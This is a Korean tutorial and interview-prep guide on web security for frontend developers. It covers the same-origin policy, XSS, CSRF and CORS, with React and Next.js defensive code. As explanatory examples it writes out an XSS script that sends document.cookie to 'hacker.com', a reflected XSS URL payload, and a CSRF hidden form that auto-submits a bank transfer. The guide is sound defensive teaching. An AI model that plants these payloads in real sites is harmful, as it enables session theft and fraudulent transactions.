## 1. 동일 출처 정책 (Same-Origin Policy) 🔴

> 💡 **모든 웹 보안의 근간! 이것부터 이해해야 나머지가 보인다!**

```
출처(Origin) = 프로토콜 + 도메인 + 포트

  https://www.myshop.com:443/products
  |_____|  |_____________|  |___|
  프로토콜    도메인          포트

이 3개가 전부 같아야 "같은 출처"!

같은 출처 (Same-Origin):
  https://myshop.com/products  ✅
  https://myshop.com/about     ✅ (경로만 다름!)

다른 출처 (Cross-Origin):
  http://myshop.com            ❌ (프로토콜 다름! https vs http)
  https://api.myshop.com       ❌ (서브도메인 다름!)
  https://myshop.com:8080      ❌ (포트 다름!)
  https://othershop.com        ❌ (도메인 다름!)

Same-Origin Policy란?
  "브라우저는 다른 출처의 리소스에 함부로 접근할 수 없다!"
  → 내 사이트의 JS가 다른 사이트의 데이터를 훔칠 수 없게!
  → 웹 보안의 가장 기본적인 방어벽!
```

## 2. XSS (Cross-Site Scripting) 🔴

> 💡 **비유: 식당 메뉴판에 몰래 "독약 넣으세요"라고 적어두는 것!**
> 해커가 웹사이트에 악성 스크립트를 심어두면,
> 다른 사용자가 그 페이지를 열 때 해커의 코드가 실행됨!

### XSS 공격 원리

```
1. 해커가 댓글에 악성 코드를 작성:
   <script>
     // 사용자의 쿠키(로그인 토큰!)를 해커 서버로 전송!
     fetch("https://hacker.com/steal?cookie=" + document.cookie);
   </script>

2. 이 댓글이 DB에 저장됨

3. 다른 사용자가 댓글을 읽을 때:
   → 브라우저가 <script>를 실행!
   → 사용자의 로그인 토큰이 해커에게!
   → 해커가 그 토큰으로 사용자 행세! 😱
```

### XSS 3가지 유형

```
1. Stored XSS (저장형) — 가장 위험! ⚠️
   → 악성 코드가 DB에 저장! (댓글, 게시글)
   → 해당 페이지를 보는 모든 사용자가 피해!

2. Reflected XSS (반사형)
   → URL에 악성 코드를 심어서 전송!
   → https://myshop.com/search?q=<script>alert('해킹!')</script>
   → 이 링크를 클릭한 사용자만 피해!

3. DOM-based XSS
   → 서버를 거치지 않고 브라우저의 JS에서 직접 발생!
   → innerHTML에 사용자 입력을 직접 넣을 때!
```

### XSS 방어법 🔴

```tsx
// ❌ 위험! innerHTML에 사용자 입력을 직접 넣기!
element.innerHTML = userInput;
// 사용자가 <script>alert('해킹!')</script>을 입력하면 → 실행됨!

// ✅ 안전! textContent 사용 (HTML 해석 안 함!)
element.textContent = userInput;
// <script> 태그가 그냥 텍스트로 표시됨! (실행 안 됨!)

// ✅ React/Next.js에서는 기본적으로 안전!
function Comment({ text }: { text: string }) {
  return <p>{text}</p>;
  // React의 JSX는 자동으로 이스케이프(escape)!
  // <script>가 &lt;script&gt;로 변환되어 실행 안 됨! ✅
}

// ❌ 하지만 dangerouslySetInnerHTML은 위험!
<div dangerouslySetInnerHTML={{ __html: userInput }} />
// → 이름부터 "dangerously"! 정말 위험하다는 경고!
// → 사용자 입력을 절대 넣지 마! 신뢰할 수 있는 데이터만!
// → 반드시 sanitize(소독) 후 사용!

// ✅ DOMPurify 라이브러리로 소독!
import DOMPurify from "dompurify";
<div dangerouslySetInnerHTML={{
  __html: DOMPurify.sanitize(userInput)
}} />
// <script>를 제거하고 안전한 HTML만 남김!
```

```
XSS 방어 체크리스트:
  ✅ 사용자 입력을 화면에 표시할 때 이스케이프! (React는 자동!)
  ✅ dangerouslySetInnerHTML 사용 시 DOMPurify로 소독!
  ✅ Cookie에 HttpOnly 설정! (JS로 접근 불가!)
  ✅ Content-Security-Policy 헤더 설정!
  ✅ URL 파라미터도 이스케이프!
```

## 3. CSRF (Cross-Site Request Forgery) 🔴

> 💡 **비유: 내 이름으로 된 위조 서류!**
> 해커가 만든 사이트에서 내 브라우저를 이용해
> 내가 로그인한 은행에 "100만원 송금" 요청을 몰래 보내는 것!

### CSRF 공격 원리

```
1. 사용자가 은행 사이트에 로그인 (쿠키 발급!)
   → 브라우저에 은행 쿠키가 저장됨

2. 사용자가 해커의 사이트를 방문 (피싱 링크 클릭!)

3. 해커의 사이트에 숨겨진 폼:
   <form action="https://bank.com/transfer" method="POST">
     <input type="hidden" name="to" value="해커계좌" />
     <input type="hidden" name="amount" value="1000000" />
   </form>
   <script>document.forms[0].submit();</script>

4. 브라우저가 자동으로 은행 쿠키를 포함하여 요청 전송!
   → 은행 서버: "쿠키가 있으니 정상 사용자구나!" → 송금 처리! 😱

핵심: 브라우저는 해당 도메인의 쿠키를 자동으로 포함!
     → 해커가 직접 쿠키를 훔치지 않아도 공격 가능!
```

### CSRF 방어법 🔴

```
1. SameSite 쿠키 속성! ⭐ (가장 중요!)
   Set-Cookie: token=abc; SameSite=Strict
   → 다른 사이트에서 오는 요청에 쿠키를 안 보냄!
   → 해커 사이트에서 은행으로 요청 → 쿠키 안 붙음 → 차단!

   SameSite 3가지:
     Strict: 같은 사이트에서만 쿠키 전송! (가장 안전!)
     Lax: 링크 클릭 이동은 허용, POST는 차단! (기본값!)
     None: 제한 없음 (Secure 필수!)

2. CSRF 토큰!
   → 서버가 폼마다 고유한 랜덤 토큰을 발급!
   → 폼 전송 시 토큰을 함께 보냄!
   → 해커는 이 토큰을 모르므로 위조 불가!

3. Referer/Origin 헤더 검증!
   → 요청이 어디서 왔는지 확인!
   → bank.com이 아닌 hacker.com에서 왔으면 차단!

Next.js Server Actions는?
  → 프레임워크가 내부적으로 CSRF 방어를 처리! ⭐
  → 숨겨진 엔드포인트 + 고유 ID로 외부 요청 차단!
```

## 4. CORS (Cross-Origin Resource Sharing) 🔴

> 💡 **비유: 외국인 입국 심사!**
> 같은 나라(Same-Origin) 사람은 자유롭게 통행!
> 외국(Cross-Origin)에서 온 사람은 "비자(허가)"가 필요!
> CORS = 서버가 "이 외국인은 입국 허가!" 라고 비자를 발급하는 것!

### CORS 에러 — 프론트엔드 개발자의 악몽!

```
프론트엔드(localhost:3000)에서 백엔드 API(localhost:8080)를 호출하면:

❌ 에러 메시지:
  Access to fetch at 'http://localhost:8080/api/products'
  from origin 'http://localhost:3000' has been blocked by CORS policy:
  No 'Access-Control-Allow-Origin' header is present on the requested resource.

왜?
  → localhost:3000과 localhost:8080은 포트가 다름!
  → 다른 출처(Cross-Origin)!
  → 서버가 "이 출처를 허가한다"는 헤더를 안 보냈으니 브라우저가 차단!

⚠️ 핵심: CORS는 브라우저가 차단하는 것!
  → 서버는 정상적으로 응답을 보냄!
  → 하지만 브라우저가 "허가 안 됐네? 차단!" 하고 응답을 버림!
  → Postman에서는 CORS 에러 안 남! (브라우저가 아니니까!)
```

### CORS 해결 — 서버에서 허가 헤더 추가! 🔴

```ts
// Next.js Route Handler에서 CORS 허가!
export async function GET() {
  const data = { message: "안녕!" };

  return Response.json(data, {
    headers: {
      // ⭐ 이 출처에서 오는 요청을 허가!
      "Access-Control-Allow-Origin": "http://localhost:3000",

      // 허용할 메서드!
      "Access-Control-Allow-Methods": "GET, POST, PUT, DELETE",

      // 허용할 헤더!
      "Access-Control-Allow-Headers": "Content-Type, Authorization",
    },
  });
}

// 또는 모든 출처 허용 (개발 중에만! 프로덕션에서는 ❌)
"Access-Control-Allow-Origin": "*"
```

### Next.js에서 CORS 설정 (next.config.ts)

```ts
// next.config.ts
const nextConfig = {
  async headers() {
    return [
      {
        source: "/api/:path*",  // /api/ 하위 모든 경로!
        headers: [
          { key: "Access-Control-Allow-Origin", value: "https://mysite.com" },
          { key: "Access-Control-Allow-Methods", value: "GET, POST, PUT, DELETE" },
          { key: "Access-Control-Allow-Headers", value: "Content-Type, Authorization" },
        ],
      },
    ];
  },
};
```

### Preflight 요청 (OPTIONS) 🟡

```
브라우저가 "위험한" 요청을 보내기 전에 먼저 허가를 물어봄!

"위험한" 요청:
  → POST/PUT/DELETE 메서드
  → Content-Type: application/json 헤더
  → Authorization 헤더

흐름:
  1. 브라우저 → 서버: OPTIONS /api/products (사전 질문!)
     "나 POST 보내도 돼?"

  2. 서버 → 브라우저: 200 OK + CORS 헤더
     "응, 보내도 돼!"

  3. 브라우저 → 서버: POST /api/products (실제 요청!)
     "그럼 데이터 보낼게!"

Next.js에서 Server Actions를 쓰면?
  → 같은 출처(Same-Origin)이므로 CORS 문제 없음! ⭐
  → 이것이 Server Actions의 숨겨진 장점!
```

## 면접 대비

### 🔴 필수 질문

**Q1. XSS 공격이란? React에서 어떻게 방어하나요?**

> XSS는 해커가 웹사이트에 악성 JavaScript를 삽입하여 다른 사용자의 쿠키, 개인정보를 탈취하는 공격이다. React는 JSX에서 변수를 렌더링할 때 자동으로 HTML을 이스케이프하여 `<script>` 태그가 실행되지 않는다. 단, `dangerouslySetInnerHTML`을 사용할 때는 DOMPurify 같은 라이브러리로 반드시 sanitize해야 한다. 쿠키에는 HttpOnly 속성을 설정하여 JavaScript의 접근을 차단한다.

**Q2. CSRF 공격과 방어법?**

> CSRF는 사용자가 로그인한 상태에서 해커의 사이트를 방문하면, 해커가 사용자의 브라우저를 이용해 원래 사이트에 위조 요청을 보내는 공격이다. 브라우저가 쿠키를 자동으로 포함하기 때문에 서버는 정상 요청으로 착각한다. 방어법은 쿠키에 `SameSite=Strict` 속성을 설정하여 다른 사이트에서 오는 요청에 쿠키를 포함하지 않게 하는 것이다. Next.js의 Server Actions는 프레임워크가 내부적으로 CSRF를 방어한다.

**Q3. CORS란? 왜 에러가 나고 어떻게 해결하나요?**

> CORS(Cross-Origin Resource Sharing)는 브라우저의 Same-Origin Policy에 의해 다른 출처의 리소스 접근이 차단될 때, 서버가 특정 출처를 허가하는 메커니즘이다. 프론트(localhost:3000)에서 백엔드(localhost:8080)로 요청하면 포트가 달라 Cross-Origin이 되어 CORS 에러가 발생한다. 서버 응답 헤더에 `Access-Control-Allow-Origin`을 추가하여 해결한다. Next.js의 Server Actions는 같은 출처이므로 CORS 문제가 없다.
